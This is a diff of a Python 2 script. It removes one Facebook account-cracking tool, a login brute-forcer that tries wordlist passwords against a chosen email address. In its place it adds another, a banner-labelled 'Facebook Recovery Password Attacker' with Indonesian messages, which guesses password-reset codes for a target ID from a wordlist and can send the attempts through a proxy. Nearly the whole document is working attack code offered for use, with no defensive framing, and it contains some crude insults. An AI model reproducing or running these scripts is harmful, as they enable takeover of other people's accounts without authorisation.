@@ -1,87 +1,111 @@
-#!/usr/bin/env python
-# -*- coding: UTF-8 -*-
-
-import sys
-import mechanize
-import cookielib
-import random
 
 
+import urllib2 ,sys ,re
+import os
+import ssl
+import time
+
+def cls():
+    linux = 'clear'
+    windows = 'cls'
+    os.system([linux,windows][os.name == 'nt'])
+
+cls()
+
+os.system(['','color D'][os.name == 'nt'])
+
+print '''
+                SELAMAT DATANG
+                     DI
+                ACEH CYBER TEAM
+           CODE: BY R15ky Ch4nn3L
+     FACEBOOK RECOVERY PASSWORD ATTACKER
+  
+ _____              _                 _
+|  ___|_ _  ___ ___| |__   ___   ___ | | __
+| |_ / _` |/ __/ _ \ '_ \ / _ \ / _ \| |/ /
+|  _| (_| | (_|  __/ |_) | (_) | (_) |   <
+|_|  \__,_|\___\___|_.__/ \___/ \___/|_|\_\                                '''
+if len(sys.argv) != 3:
+    print "\n\n[#] Penulisan: python2 fb.py [TagetID] [listkode.txt] "
+    sys.exit()
+
+target = sys.argv[1]
+wordlist = sys.argv[2]
 
 
-email = str(raw_input("Enter the Facebook Username (or) Email (or) Phone Number : "))
+while True:
+    print """
+    ============ Menu ==============
+    1- Reset Password Korban Dengan Proxy
+    2- Dengan Proxy saja
+    
+    """
+
+    choice=raw_input("Masuka  Pilihan Mu: ")
+
+    if choice=="1":
+        try:
+            word = open(wordlist, 'r').readlines()
+            print "[+] Kode Nya Tersimpan \!/\n[+] Codes:",len(word)
+        except("IOError"):
+            print "[-] Hanya dalam Format .txt Ngentod :v"
+            sys.exit(1);
+
+        for w in word:
+            w = w.rstrip()
+            try:
+                target = 'https://m.facebook.com/recover/password?u='+target+'&n='+w
+                get = urllib2.urlopen(target).read()
+    
+            except IOError:
+                print " Gabisa Dimuat Halaman Nya :( "
+    
+            search = re.search('password_new', get)
+            if search:
+                print "[+] Kode Yang Ini "+w+" Bener anda beuntung^___^ "
+            else:
+                print "[+] Kode Yangini "+w+" Salah nyan >:( "
+    else:
+
+        print """
+
+        Selamat Datang Di Tools Saya Masukan Proxy:Port Anda Beb:*
+
+        Penggunaan : [ip:port]
 
 
-passwordlist = str(raw_input("Enter the wordlist name and path : "))
+        """
+        ip_proxy=raw_input("Masukan Proxy Mu  : ")
+        print "[##] Proxy Terpasang : "+ip_proxy
+        proxy = urllib2.ProxyHandler({'http': ip_proxy})
+        opener = urllib2.build_opener(proxy)
+        urllib2.install_opener(opener)
+        
+        #ip = urllib2.urlopen('http://checkip.dyndns.org').read()
+        #theIP = re.findall(r"\d{1,3}\.\d{1,3}\.\d{1,3}.\d{1,3}", ip)
+        #print theIP
+        #datum = response.read()
+        #response.close()
+        #print datum
+        try:
+            word = open(wordlist, 'r').readlines()
+            print "[+] Kode Reset Tersimpan \!/\n[+] Kodd:",len(word)
+        except("IOError"):
+            print "[-] Yang Ini Gabisa Di Pake Anjirr !!"
+            sys.exit(1);
 
-
-login = 'https://id-id.facebook.com/login/'
-
-
-useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
-
-def main():
-	global br
-	br = mechanize.Browser()
-	cj = cookielib.LWPCookieJar()
-	br.set_handle_robots(False)
-	br.set_handle_redirect(True)
-	br.set_cookiejar(cj)
-	br.set_handle_equiv(True)
-	br.set_handle_referer(True)
-	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
-	welcome()
-	search()
-	print("Password does not exist in the wordlist")
-
-	
-	
-def brute(password):
-	sys.stdout.write("\r[*] Trying ..... {}\n".format(password))
-	sys.stdout.flush()
-	br.addheaders = [('User-agent', random.choice(useragents))]
-	site = br.open(login)
-	br.select_form(nr = 0)
-	br.form['email'] = email
-	br.form['pass'] = password
-	sub = br.submit()
-	log = sub.geturl()
-	if log != login and (not 'login_attempt' in log):
-			print("\n\n[+] Password Find = {}".format(password))
-			raw_input("ANY KEY to Exit....")
-			sys.exit(1)
-
-			
-def search():
-	global password
-	passwords = open(passwordlist,"r")
-	for password in passwords:
-		password = password.replace("\n","")
-		brute(password)
-
-		
-#welcome 
-def welcome():
-	wel = """
-
-        +=========================================+
-        |..........   Facebook Crack   ...........|
-        +-----------------------------------------+
-        |            #Author: Mr.W4W4N            | 
-        |	       Version 1.0                |
- 	|   https://www.youtube.com/c/Mr.W4W4N    |
-        +=========================================+
-        |..........  Facebook Cracker  ...........|
-        +-----------------------------------------+\n\n
-"""
-	total = open(passwordlist,"r")
-	total = total.readlines()
-	print wel 
-	print " [*] Account to crack : {}".format(email)
-	print " [*] Loaded :" , len(total), "passwords"
-	print " [*] Cracking, please wait ...\n\n"
-
-	
-if __name__ == '__main__':
-	main()
-
+        for w in word:
+            w = w.rstrip()
+            try:
+                target = 'https://m.facebook.com/recover/password?u='+target+'&n='+w
+                get = urllib2.urlopen(target).read()
+                
+            except IOError:
+                print " Yahh halaman ny gabisa dimuat :( "
+        
+            search = re.search('password_new', get)
+            if search:
+                print "[+] Kodenya yang ini "+w+" Bener Sayang :* "
+            else:
+                print "[+] Kode Yang Ini "+w+" Gabisa Dipakai Tod :v "
